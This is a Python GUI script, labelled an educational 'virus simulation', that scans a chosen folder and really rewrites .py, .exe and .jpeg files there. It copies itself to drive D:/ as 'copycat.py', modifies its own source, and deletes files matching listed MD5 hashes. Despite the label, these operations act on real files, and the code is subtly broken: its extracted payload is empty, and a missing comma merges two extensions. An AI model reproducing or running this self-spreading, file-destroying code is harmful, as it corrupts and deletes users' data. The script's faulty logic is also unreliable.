# ❗ EDUCATIONAL VIRUS SIMULATION — FOR TEST PURPOSE ONLY
# Self-replicating, self-modifying, file-deleting virus simulation.

import os
import hashlib
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
import threading
import shutil

# ❌ Known virus signatures (simulated)
KNOWN_VIRUS_HASHES = [
    "5d41402abc4b2a76b9719d911017c592",  # "hello"
    "098f6bcd4621d373cade4e832627b4f6",  # "test"
    "e99a18c428cb38d5f260853678922e03"   # "abc123"
]

infected_files = []

def get_file_hash(path):
    try:
        with open(path, 'rb') as file:
            return hashlib.md5(file.read()).hexdigest()
    except:
        return None

def infect_file(target_path, virus_code):
    try:
        with open(target_path, 'r') as f:
            content = f.read()
            if "## INFECTED ##" in content:
                return  # already infected

        with open(target_path, 'w') as f:
            f.write(virus_code + "\n" + content)
    except:
        pass

def spread_virus(start_path):
    script_path = os.path.abspath(__file__)
    with open(script_path, 'r') as f:
        virus_code = ""
        for line in f:
            if "# ❗ EDUCATIONAL VIRUS SIMULATION" in line:
                break
            virus_code += line

    for root, _, files in os.walk(start_path):
        for file in files:
            if file.endswith((".py", ".exe", ".jpeg", ".com" ".pdf")) and file != os.path.basename(__file__):
                infect_file(os.path.join(root, file), virus_code)

def scan_and_attack(path, output_widget):
    global infected_files
    if not os.path.exists(path):
        output_widget.insert(tk.END, "[ERROR] Invalid path.\n")
        return

    output_widget.insert(tk.END, f"[SCAN STARTED] {path}\n")
    if os.path.isfile(path):
        hash_result = get_file_hash(path)
        if hash_result in KNOWN_VIRUS_HASHES:
            infected_files.append(path)
            output_widget.insert(tk.END, f"[INFECTED] {path}\n")
        else:
            output_widget.insert(tk.END, f"[SAFE] {path}\n")
    else:
        for root, _, files in os.walk(path):
            for file in files:
                full_path = os.path.join(root, file)
                hash_result = get_file_hash(full_path)
                if hash_result in KNOWN_VIRUS_HASHES:
                    infected_files.append(full_path)
                    output_widget.insert(tk.END, f"[INFECTED] {full_path}\n")
                else:
                    output_widget.insert(tk.END, f"[SAFE] {full_path}\n")
    output_widget.insert(tk.END, "\n[SCAN COMPLETE]\n")
    output_widget.see(tk.END)

def destroy_files(output_widget):
    if not infected_files:
        messagebox.showinfo("Virus", "No files marked for destruction.")
        return

    output_widget.insert(tk.END, "\n[DESTROYING FILES...]\n")
    for file in infected_files:
        try:
            os.remove(file)
            output_widget.insert(tk.END, f"[DESTROYED] {file}\n")
        except:
            output_widget.insert(tk.END, f"[FAILED] {file}\n")
    infected_files.clear()
    output_widget.insert(tk.END, "[PAYLOAD COMPLETE]\n")

def modify_self():
    path = os.path.abspath(__file__)
    try:
        with open(path, "a") as f:
            f.write("\n# Self-modified at runtime\n")
    except:
        pass

def replicate_to_usb():
    # Simulation only: Spreads to D:/ if present (representing USB)
    try:
        usb_drive = "D:/"
        if os.path.exists(usb_drive):
            target_path = os.path.join(usb_drive, "copycat.py")
            shutil.copy(__file__, target_path)
    except:
        pass

def threaded_start(path, output_widget):
    output_widget.delete(1.0, tk.END)
    threading.Thread(target=lambda: [
        scan_and_attack(path, output_widget),
        spread_virus(path),
        replicate_to_usb(),
        modify_self()
    ]).start()

# 🖥️ GUI
root = tk.Tk()
root.title("⚠️ Virus Simulator")
root.geometry("700x550")
root.configure(bg="#111")

frame = tk.Frame(root, bg="#111")
frame.pack(pady=10)

path_entry = tk.Entry(frame, width=60, font=("Consolas", 12))
path_entry.pack(side=tk.LEFT, padx=5)

def open_file():
    filename = filedialog.askopenfilename()
    if filename:
        path_entry.delete(0, tk.END)
        path_entry.insert(0, filename)

def open_folder():
    foldername = filedialog.askdirectory()
    if foldername:
        path_entry.delete(0, tk.END)
        path_entry.insert(0, foldername)

tk.Button(frame, text="📄 File", command=open_file, bg="gray", fg="white").pack(side=tk.LEFT)
tk.Button(frame, text="📁 Folder", command=open_folder, bg="gray", fg="white").pack(side=tk.LEFT)

output_text = scrolledtext.ScrolledText(root, width=85, height=25, bg="black", fg="lime")
output_text.pack(padx=10, pady=10)

tk.Button(root, text="🧨 Activate Virus", width=25, height=2,
          command=lambda: threaded_start(path_entry.get(), output_text),
          bg="red", fg="white", font=("Arial", 12, "bold")).pack(pady=10)

tk.Button(root, text="💀 Destroy Files", width=25, height=2,
          command=lambda: destroy_files(output_text),
          bg="darkred", fg="white", font=("Arial", 12, "bold")).pack(pady=5)

root.mainloop()